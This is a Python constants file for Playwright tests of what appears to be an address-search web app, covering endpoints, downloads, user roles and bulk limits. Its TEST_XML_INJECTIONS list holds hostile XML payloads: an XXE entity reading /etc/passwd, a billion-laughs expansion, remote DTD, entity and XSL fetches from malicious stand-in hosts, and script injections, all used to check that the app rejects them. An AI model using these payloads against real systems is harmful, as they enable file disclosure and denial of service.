from tests.pytest_tests.pytest_playwright_tests.utils.constatns_generation import (
    build_downloads_info, build_user_role_map)
""" Constants for the playwright tests. """

BASE_URL = "http://127.0.0.1:5001/"

TEST_XML_INJECTIONS = [
    """<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY ext SYSTEM "file:///etc/passwd">]><root><test>&ext;</test></root>""",
    """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;">]><lolz>&lol9;</lolz>""",
    """<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://example.com/malicious.dtd"><root><payload>test</payload></root>""",
    """<?xml version="1.0"?><root><![CDATA[<script>alert('Injected JS');</script>]]></root>""",
    """<root><test><script>alert('Injected!');</script></test></root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY remoteEntity SYSTEM "http://malicious.example.com/evil.xml">]><root><data>&remoteEntity;</data></root>""",
    """<!-- Attempting to hide payload in comments --><!-- <script>document.cookie = 'stolen';</script> --><root>Legitimate content</root>""",
    """<root><normal>Value</normal></root></malicious>""",
    """<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://malicious.example.com/evil.xsl"?><root><data>Test</data></root>""",
    """<root><script>var injectedValue = 'ThisIsInjected'; alert('JS variable set: ' + injectedValue);</script></root>"""
]
XML_ERROR_MESSAGE = 'XML Attack Detected. This incident will be reported.'

# Downloads are files that can be downoaded, whereas static files are served inside html page as content
DOWNLOADS = [
    {
        'download_name': 'classifications',
        'description': 'A list of all classifications from the API',
        'url_modifier': 'downloads/classifications_list',
        'file_name': 'classifications.csv',
        'expected_content': None,
    },
    {
        'download_name': 'Example Multiple Address',
        'description':
        'An example of how multuple addresses in a CSV file should be submitted',
        'url_modifier': 'downloads/example_multiple_address',
        'file_name': 'example_multiple_match_upload.csv',
        'expected_content': None,
    },
    {
        'download_name': 'Large Example Multiple Address',
        'description':
        'An example of how multuple addresses in a CSV file should be submitted for the Large Bulk interface',
        'url_modifier': 'downloads/example_multiple_address_big',
        'file_name': 'example_multiple_match_5k_upload.csv',
        'expected_content': None,
    },
    {
        'download_name': 'Tool Tip Information',
        'description':
        'In order to provide the tooltips, this file is provided to give a description for each attribute.',
        'url_modifier': 'downloads/tool_tip_clerical_information',
        'file_name': 'tool_tip_clerical_information.csv',
        'expected_content': None,
    },
    {
        'download_name': 'UPRN Example Multiple Address',
        'description': 'Example of how to submit multiple UPRNs in a CSV file',
        'url_modifier': 'downloads/uprn_example_multiple_address',
        'file_name': 'uprn_example_multiple_match_upload.csv',
        'expected_content': None,
    },
]

# Downloads are files that can be downoaded, whereas static files are served inside html page as content
STATIC_FILES = [
    {
        'download_name': 'Autosuggest Classifications',
        'description':
        'The Classifications data in a format for the autosuggest. Includes a reversed version of the same data for reverse surfing.',
        'static_file': True,
        'url_modifier': 'autosuggest/classifications.json',
        'file_name': 'autosuggest_classifications.json',
        'expected_content': None,
    },
    {
        'download_name': 'Autosuggest API URLs',
        'description':
        'API endpoints for the autosuggest in the developers page',
        'static_file': True,
        'url_modifier': 'autosuggest/api-urls.json',
        'file_name': 'autosuggest_api_urls.json',
        'expected_content': None,
    },
]

DOWNLOADS = build_downloads_info(DOWNLOADS)
STATIC_FILES = build_downloads_info(STATIC_FILES)


def get_download_info(download_name: str):
  """ Given a download name, return the download information """
  for download in DOWNLOADS:
    if download.get('download_name') == download_name:
      return download

  raise ValueError(f"Unknown download name: {download_name}")


# Inputs that should cause no errors
GENERIC_TEST_INPUTS = {
    'searchable_address': {
        'type': 'input',
        'label_text': 'Enter Search String',
        'content_to_set': 'test address',
    },
    'searchable_postcode': {
        'type': 'input',
        'label_text': 'To get started, enter a PostCode',
        'content_to_set': 'EX4 3EU',
    },
    'available_epoch': {
        'type': 'checkbox',
        'css_selector': 'input[type="radio"][id="111"]',
        'content_to_set': 'checked',
    },
    'unavailable_epoch': {
        'type': 'checkbox',
        'css_selector': 'input[type="radio"][id="50"]',
        'content_to_set': 'checked',
    },
    'available_classification': {
        'type': 'input',
        'label_text': 'Classification',
        'content_to_set': 'R',
    },
    'available_limit': {
        'type': 'input',
        'label_text': 'Limit',
        'content_to_set': '10',
    }
}


def set_input_content(generic_test_input: dict, input_to_set: str):
  """ Given a generic test input and a string, set the input content """

  # Make a local copy of the generic test input
  test_input = generic_test_input.copy()

  test_input['content_to_set'] = input_to_set

  return test_input


EPOCH_OPTIONS = [
    {
        'number': '50',
        'text_label': 'September 1999'
    },
    {
        'number': '111',
        'text_label': 'October 2022'
    },
]

LOCATION_OPTIONS = [
    'England', 'Scotland', 'Wales', 'Northern Ireland', 'Channel Islands',
    'Isle of man', 'Offshore etc.'
]

ALL_PAGE_NAMES = [
    'singlesearch',
    'uprn',
    'postcode',
    'typeahead',
    'multiple_address_original',
    'multiple_address_results',
    'multiple_address',
    'uprn_multiple_match',
    'custom_response',
    'help',
    'help_submit_feedback',
    'help_confidence_score',
    'help_help_and_documentation',
    'settings',
]

ROLES = ['default', 'developers', 'bulk_removed', 'limited_bulk']

DEFAULT_BULK_LIMITS = {
    'limit_mini_bulk': 5000,
    'limit_vast_bulk': 100000,
    'limit_uprn_match': 5000,
}

# yapf: disable
ENDPOINTS = [{
    'page_name': 'Single Search',      # Name as it appears in the UI
    'page_name_test': 'singlesearch',  # Name as it appears in 'ALL_PAGE_NAMES'
    'url': '',                    # URL of the page
    'nav_link_in_header': True,  # Whether the page should appear in the header
    'page_description': 'Provide as much of the address as possible for best results.',
}, {
    'page_name': 'Single UPRN',
    'page_name_test': 'uprn',
    'url': 'uprn',
    'nav_link_in_header': True,
    'page_description': 'Search for a property via its unique property reference number. This is a 12 digit number which contains no characters.',
}, {
    'page_name': 'Postcode',
    'page_name_test': 'postcode',
    'url': 'postcode',
    'nav_link_in_header': True,
    'page_description': "Search for a property using its postcode. This is effective and a valid postcode will return a list of possible addresses.",
}, {
    'page_name': 'Typeahead',
    'page_name_test': 'typeahead',
    'url': 'typeahead',
    'nav_link_in_header': True,
    'page_description': 'This search types ahead. Autosuggest on steroids basically. Useful if you quickly want a user to find an address.',
}, {
    'page_name': 'Multiple Address',
    'page_name_test': 'multiple_address_original',
    'url': 'multiple_address_original',
    'nav_link_in_header': True,
    'page_description':'Search for not just  one address. Several. Get lots of results you can look through. This service completes many single searches from a file.',
}, {
    'page_name': 'Multiple Address',
    'page_name_test': 'multiple_address',
    'url': 'multiple_address',
    'nav_link_in_header': False,
    'page_description':'Used to submit a large multiple match request with a file to an asynchronous job manager.',
}, {
    'page_name': 'Multiple Address',
    'page_name_test': 'multiple_address_results',
    'url': 'multiple_address_results',
    'nav_link_in_header': False,
    'page_description':'Used to submit a large multiple match request with a file to an asynchronous job manager.',
}, {
    'page_name': 'Multiple UPRN',
    'page_name_test': 'uprn_multiple_match',
    'url': 'uprn_multiple_match',
    'nav_link_in_header': True,
    'page_description': 'Search for multiple addresses providing mulitple UPRNs (Unique Property Reference Numbers)',
}, {
    'page_name': 'API',
    'page_name_test': 'custom_response',
    'url': 'custom_response',
    'nav_link_in_header': True,
    'page_description': 'Submit requests directly to the API and receive JSON style fromatting in return. Use this if you want to test out API features that the UI currently does not support',
}, {
    'page_name': 'Help',
    'page_name_test': 'help',
    'url': 'help/home',
    'nav_link_in_header': True,
    'page_description': 'See information about the other pages and how to contact support.',
}, {
    'page_name': 'Help',
    'page_name_test': 'help_confidence_score',
    'url': 'help/confidence_score',
    'nav_link_in_header': False,
    'page_description': 'Explanation of confidence Score',
}, {
    'page_name': 'Help',
    'page_name_test': 'help_submit_feedback',
    'url': 'help/submit_feedback',
    'nav_link_in_header': False,
    'page_description': 'Explanation of how to submit feedback to the service',
}, {
    'page_name': 'Help',
    'page_name_test': 'help_help_and_documentation',
    'url': 'help/help_and_documentation',
    'nav_link_in_header': False,
    'page_description': 'Generic helpful resources for using the UI and service',
}, {
    'page_name': 'Settings',
    'page_name_test': 'settings',
    'url': 'settings',
    'nav_link_in_header': True,
    'page_description': 'User preferences are stored locally on their web-browser. Adjust or reset those settings here.',
}, {
    'page_name': 'Login',
    'page_name_test': 'login_redirect',
    'redirect': True,
    'url': 'login',
    'redirect_url': '',
    'nav_link_in_header': False,
    'page_description': 'Page for local login, now redirects to the home page as login managed by Google IAM',
}, {
    'page_name': 'Log Out',
    'page_name_test': 'logout_redirect',
    'redirect': True,
    'url': 'logout',
    'redirect_url': None, # Expect visible elements instead
    'redirect_visible_elements': ['Sign in', 'Use your Google Account', 'Email or phone'],
    'nav_link_in_header': False,
    'page_description': 'Generic helpful resources for using the UI and service',
},
]
# yapf: enable

# yapf: disable
USER_ROLE_MAP = [{
      'role': 'default',
      'username': '',
      'pages_to_remove': ['custom_response'],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'default',
      'username': 'testDefaultExplicit',
      'pages_to_remove': ['custom_response'],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'developers',
      'username': 'testDeveloperExplicit',
      'pages_to_remove': [],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'bulk_removed',
      'username': 'testBulkRemovedExplicit',
       'pages_to_remove': [
            'multiple_address_original', 'uprn_multiple_match',
            'multiple_address', 'multiple_address_results'
        ],
      'default_bulk_limits': DEFAULT_BULK_LIMITS,
  }, {
      'role': 'limited_bulk',
      'username': 'testBulkLimitedExplicit',
      'pages_to_remove': [],
      'bulk_limits': {
            'bulk_limits': {
            'limit_mini_bulk': 10,
            'limit_vast_bulk': 550,
            'limit_uprn_match': 50,
        }
      },
  }]
# yapf: disable

build_user_role_map = build_user_role_map(USER_ROLE_MAP, ALL_PAGE_NAMES, ENDPOINTS)

def role_to_username(role: str):
  """ Given a role, give an example username, expected page access and bulk limits """
  for user in USER_ROLE_MAP:
    if user.get('role') == role:
      return user

  raise ValueError(f"Unknown role: {role}")

def get_redirect_endpoints():
  """ Return a list of endpoints that are redirects """
  redirect_endpoints = []
  for page in ENDPOINTS:
    if page.get('redirect'):
      redirect_endpoints.append(page)
  return redirect_endpoints

def get_page_url_from_page_name(page_name: str):
  """ Given a page name, return the page URL """
  for page in ENDPOINTS:
    if page.get('page_name_test') == page_name:
      return page.get('url')

  raise ValueError(f"Unknown page name: {page_name}")


def get_just_header_pages(allowed_pages_info: list):
  """ Given a list of allowed pages, return the pages that should be in the header """
  header_pages = []
  for page in allowed_pages_info:
    if page.get('nav_link_in_header'):
      header_pages.append(page)
  return header_pages
